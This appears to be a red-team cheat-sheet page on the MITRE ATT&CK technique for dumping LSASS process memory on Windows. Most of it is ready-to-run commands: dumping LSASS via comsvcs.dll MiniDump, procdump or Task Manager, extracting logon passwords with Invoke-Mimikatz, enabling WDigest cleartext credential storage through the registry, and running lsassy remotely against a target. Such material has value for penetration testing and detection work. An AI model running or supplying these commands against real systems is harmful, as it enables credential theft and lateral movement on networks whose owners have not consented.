---
description: https://attack.mitre.org/techniques/T1003/001/
---

# LSASS Memory

**ATT\&CK ID:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

**Permissions Required:** <mark style="color:red;">**Administrator**</mark> | <mark style="color:red;">**SYSTEM**</mark>

**Description**

Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

## Techniques

### comsvcs.dll

```powershell
# Get lsass.exe PID
tasklist /fi "Imagename eq lsass.exe"

# Call comsvcs.dll and dump to file.
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> \Windows\Temp\lsass_dump.dmp full

# Dump with Mimikatz
Invoke-Mimikatz -Command "sekurlsa::Minidump lsass_dump.dmp"
Invoke-Mimikatz -Command "sekurlsa::logonPasswords /full"
```

### Mimikatz

```powershell
Invoke-Mimikatz -DumpCreds
```

![](../../../../.gitbook/assets/Mimikatz-DumpCreds.png)

### Procdump

**URL:** [https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)

```batch
.\procdump.exe -accepteula -ma lsass.exe lsass_dump
```

![](../../../../.gitbook/assets/procdump.png)

`Mimikatz` can then be used to pull information from the `lsass_dump.dmp` file.

```powershell
Invoke-Mimikatz -Command "sekurlsa::Minidump lsass_dump.dmp"
Invoke-Mimikatz -Command "sekurlsa::logonPasswords /full"
```

## Dumping cleartext credentials

The storage mechanism used by WDigest stores passwords in clear text in memory. If an adversary gains access to a system , they can utilize tools like Mimikatz and Lsassy to retrieve not only the password hashes stored in memory, but also the actual passwords in clear text

As a consequence, the attacker would not be restricted to only Pass-the-Hash methods of lateral movement, but could potentially gain access to other resources such as Exchange, internal websites, and any other systems that require a user ID and password for authentication.

```powershell
# CMD (Enable), Requires user to log off/on or lock screen to store in cleartext
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# CMD (Disable), System reboot required to complete
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

```powershell
# Mimikatz (Everything)
Invoke-Mimikatz -DumpCreds
# Mimikatx (Just WDigest)
Invoke-Mimikatz -Command '"sekurlsa::wdigest"'

# Lsassy
lsassy -u '[User]' -p '[Password]' -d '[Domain]' '[Target-IP]' --users --exec smb
```

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Task Manager / RDP

With Administrative RDP or interactive logon it is possible to create a dump file from Lsass.exe using Task Manger.

_Lsass.exe -> Right Click -> Create Dump File_

<figure><img src="../../../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>

Use Mimikatz to read the dump file after transfering the file to an attacker controlled system

```powershell
Invoke-Mimikatz -Command "sekurlsa::Minidump lsass.DMP"
Invoke-Mimikatz -Command "sekurlsa::logonPasswords /full"
```
